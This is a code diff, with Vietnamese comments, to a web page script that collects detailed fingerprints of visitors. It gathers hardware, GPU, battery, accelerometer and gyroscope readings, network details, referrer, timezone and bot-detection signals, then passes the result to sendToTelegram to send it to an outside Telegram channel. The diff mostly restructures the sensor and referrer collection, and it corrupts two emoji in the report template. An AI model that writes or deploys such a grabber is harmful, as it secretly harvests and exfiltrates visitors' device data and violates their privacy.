@@ -136,16 +136,33 @@
             return suspicious;
         }
 
-        // Thêm hàm kiểm tra nguồn truy cập
+        // Thêm hàm getReferrerInfo
         async function getReferrerInfo() {
-            return {
+            const referrerInfo = {
                 referrer: document.referrer || 'Truy cập trực tiếp',
-                previousPages: window.history.length,
-                navigationTiming: performance.getEntriesByType('navigation')[0],
-                sourceProtocol: window.location.protocol,
-                sourceHost: window.location.hostname,
-                sourcePath: window.location.pathname
+                sourceProtocol: '',
+                previousPages: 0
             };
+
+            try {
+                // Lấy protocol của nguồn truy cập
+                if (document.referrer) {
+                    const referrerUrl = new URL(document.referrer);
+                    referrerInfo.sourceProtocol = referrerUrl.protocol;
+                }
+
+                // Kiểm tra navigation timing nếu được hỗ trợ
+                if (window.performance && window.performance.getEntriesByType) {
+                    const navigationEntries = window.performance.getEntriesByType('navigation');
+                    if (navigationEntries.length > 0) {
+                        referrerInfo.previousPages = navigationEntries[0].redirectCount || 0;
+                    }
+                }
+            } catch (error) {
+                console.error('Lỗi khi lấy thông tin referrer:', error);
+            }
+
+            return referrerInfo;
         }
 
         // Nâng cao hàm kiểm tra thiết bị thật/giả
@@ -198,113 +215,51 @@
             const sensorData = {
                 accelerometer: {
                     supported: false,
-                    data: null,
+                    data: [],
                     anomalies: []
                 },
                 gyroscope: {
                     supported: false,
-                    data: null,
+                    data: [],
                     anomalies: []
                 },
                 orientation: {
                     supported: false,
-                    data: null,
+                    data: [],
                     anomalies: []
                 }
             };
 
-            // Theo dõi dữ liệu gia tốc
-            if ('DeviceMotionEvent' in window) {
-                sensorData.accelerometer.supported = true;
-                const accelData = [];
-                
-                await new Promise((resolve) => {
-                    const handleMotion = (event) => {
-                        const { acceleration, accelerationIncludingGravity } = event;
-                        accelData.push({
-                            x: acceleration?.x || 0,
-                            y: acceleration?.y || 0,
-                            z: acceleration?.z || 0,
-                            withGravity: {
-                                x: accelerationIncludingGravity?.x || 0,
-                                y: accelerationIncludingGravity?.y || 0,
-                                z: accelerationIncludingGravity?.z || 0
-                            },
-                            timestamp: Date.now()
-                        });
-
-                        if (accelData.length >= 10) {
-                            window.removeEventListener('devicemotion', handleMotion);
-                            resolve();
-                        }
-                    };
-
-                    window.addEventListener('devicemotion', handleMotion);
-                    setTimeout(resolve, 1000); // Timeout sau 1 giây
-                });
-
-                sensorData.accelerometer.data = accelData;
-                
-                // Phân tích dữ liệu gia tốc
-                if (accelData.length > 0) {
-                    const avgAccel = accelData.reduce((acc, curr) => ({
-                        x: acc.x + curr.x,
-                        y: acc.y + curr.y,
-                        z: acc.z + curr.z
-                    }), { x: 0, y: 0, z: 0 });
-
-                    // Kiểm tra bất thường
-                    if (Math.abs(avgAccel.x) < 0.001 && Math.abs(avgAccel.y) < 0.001) {
-                        sensorData.accelerometer.anomalies.push('Dữ liệu gia tốc quá ổn định');
-                    }
+            try {
+                if ('DeviceMotionEvent' in window) {
+                    sensorData.accelerometer.supported = true;
+                    // Thu thập dữ liệu gia tốc kế
+                    await new Promise((resolve) => {
+                        let count = 0;
+                        const maxSamples = 5;
+                        
+                        const handler = (event) => {
+                            if (count < maxSamples && event.acceleration) {
+                                sensorData.accelerometer.data.push({
+                                    x: event.acceleration.x,
+                                    y: event.acceleration.y,
+                                    z: event.acceleration.z
+                                });
+                                count++;
+                                
+                                if (count >= maxSamples) {
+                                    window.removeEventListener('devicemotion', handler);
+                                    resolve();
+                                }
+                            }
+                        };
+                        
+                        window.addEventListener('devicemotion', handler);
+                        setTimeout(resolve, 1000); // Timeout sau 1 giây
+                    });
                 }
-            }
-
-            // Theo dõi dữ liệu con quay hồi chuyển
-            if ('DeviceOrientationEvent' in window) {
-                sensorData.gyroscope.supported = true;
-                const gyroData = [];
-
-                await new Promise((resolve) => {
-                    const handleOrientation = (event) => {
-                        gyroData.push({
-                            alpha: event.alpha, // Quay theo trục Z
-                            beta: event.beta,   // Quay theo trục X
-                            gamma: event.gamma, // Quay theo trục Y
-                            timestamp: Date.now()
-                        });
-
-                        if (gyroData.length >= 10) {
-                            window.removeEventListener('deviceorientation', handleOrientation);
-                            resolve();
-                        }
-                    };
-
-                    window.addEventListener('deviceorientation', handleOrientation);
-                    setTimeout(resolve, 1000);
-                });
-
-                sensorData.gyroscope.data = gyroData;
-
-                // Phân tích dữ liệu con quay
-                if (gyroData.length > 0) {
-                    const variations = gyroData.slice(1).map((curr, i) => ({
-                        alpha: Math.abs(curr.alpha - gyroData[i].alpha),
-                        beta: Math.abs(curr.beta - gyroData[i].beta),
-                        gamma: Math.abs(curr.gamma - gyroData[i].gamma)
-                    }));
-
-                    // Kiểm tra bất thường
-                    const avgVariation = variations.reduce((acc, curr) => ({
-                        alpha: acc.alpha + curr.alpha,
-                        beta: acc.beta + curr.beta,
-                        gamma: acc.gamma + curr.gamma
-                    }), { alpha: 0, beta: 0, gamma: 0 });
-
-                    if (avgVariation.alpha < 0.01 && avgVariation.beta < 0.01 && avgVariation.gamma < 0.01) {
-                        sensorData.gyroscope.anomalies.push('Dữ liệu con quay quá ổn định');
-                    }
-                }
+            } catch (error) {
+                console.warn('Lỗi khi thu thập dữ liệu cảm biến:', error);
             }
 
             return sensorData;
@@ -312,22 +267,35 @@
 
         // Thêm hàm collectInfo
         async function collectInfo() {
+            const infoDiv = document.getElementById('info');
+            infoDiv.innerHTML = '<h2>Đang thu thập thông tin...</h2>';
+            
             try {
-                const infoDiv = document.getElementById('info');
-                infoDiv.innerHTML = '<h2>Đang thu thập thông tin...</h2>';
-
-                // Thu thập các thông tin cơ bản
+                // Thu thập thông tin cơ bản trước
                 const hardware = await getHardwareInfo();
                 const battery = await getBatteryInfo();
                 const sensors = await getSensorInfo();
                 const enhancedFingerprint = getEnhancedFingerprint();
                 const botCheck = checkEnhancedBot();
-                const referrerInfo = await getReferrerInfo();
+                
+                // Thu thập thông tin bổ sung
+                let referrerInfo = {
+                    referrer: 'Truy cập trực tiếp',
+                    sourceProtocol: '',
+                    previousPages: 0
+                };
+                
+                try {
+                    referrerInfo = await getReferrerInfo();
+                } catch (error) {
+                    console.warn('Không thể lấy thông tin referrer:', error);
+                }
+
                 const deviceAuthenticity = getDeviceAuthenticity();
                 const detailedSensors = await getDetailedSensorInfo();
 
+                // Tạo đối tượng info
                 const info = {
-                    // Thông tin cơ bản
                     userAgent: navigator.userAgent,
                     platform: navigator.platform,
                     vendor: navigator.vendor,
@@ -336,7 +304,6 @@
                     doNotTrack: navigator.doNotTrack,
                     cookieEnabled: navigator.cookieEnabled,
 
-                    // Thông tin phần cứng
                     hardwareConcurrency: navigator.hardwareConcurrency,
                     deviceMemory: navigator.deviceMemory,
                     gpu: hardware.gpu,
@@ -344,19 +311,15 @@
                     webglVersion: hardware.webglVersion,
                     maxTextureSize: hardware.maxTextureSize,
 
-                    // Thông tin màn hình
                     screenResolution: `${window.screen.width}x${window.screen.height}`,
                     colorDepth: window.screen.colorDepth,
                     pixelRatio: window.devicePixelRatio,
 
-                    // Thông tin cảm biến
                     sensors: sensors,
                     detailedSensors: detailedSensors,
 
-                    // Thông tin pin
                     battery: battery,
 
-                    // Thông tin mạng
                     connection: navigator.connection || navigator.mozConnection || navigator.webkitConnection,
                     network: {
                         effectiveType: navigator.connection?.effectiveType,
@@ -365,19 +328,15 @@
                         saveData: navigator.connection?.saveData
                     },
 
-                    // Thông tin bảo mật
                     botIndicators: botCheck,
                     deviceAuthenticity: deviceAuthenticity,
 
-                    // Thông tin nguồn
                     referrer: referrerInfo,
 
-                    // Thời gian và địa điểm
                     timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                     timezoneOffset: new Date().getTimezoneOffset(),
                     timestamp: new Date().toISOString(),
 
-                    // Bảo mật và bot
                     fingerprint: enhancedFingerprint
                 };
 
@@ -396,12 +355,12 @@
                 await sendToTelegram(info);
 
             } catch (error) {
-                const infoDiv = document.getElementById('info');
+                console.error('Lỗi khi thu thập thông tin:', error);
                 infoDiv.innerHTML = `
                     <h2>Có lỗi xảy ra</h2>
                     <p class="warning">Không thể thu thập đầy đủ thông tin: ${error.message}</p>
+                    <button onclick="location.reload()">Thử lại</button>
                 `;
-                console.error('Lỗi khi thu thập thông tin:', error);
             }
         }
 
@@ -545,13 +504,13 @@ ${info.deviceAuthenticity.confidence > 70 ? '✅' : '⚠️'} Trạng thái: ${i
 • Tỷ lệ pixel: ${info.pixelRatio || 'N/A'}x
 • Ngôn ngữ: ${info.language}
 
-📡 THÔNG TIN MẠNG
+�� THÔNG TIN MẠNG
 ▔▔▔▔▔▔▔▔▔▔▔▔▔
 • Tốc độ: ${info.network.downlink ? info.network.downlink + ' Mbps' : 'N/A'}
 • Độ trễ: ${info.network.rtt ? info.network.rtt + 'ms' : 'N/A'}
 • Tiết kiệm: ${info.network.saveData ? "Bật" : "Tắt"}
 
-🔌 KẾT NỐI
+�� KẾT NỐI
 ▔▔▔▔▔▔▔▔
 • WebRTC: ${navigator.mediaDevices ? "✅" : "❌"}
 • Bluetooth: ${navigator.bluetooth ? "✅" : "❌"}
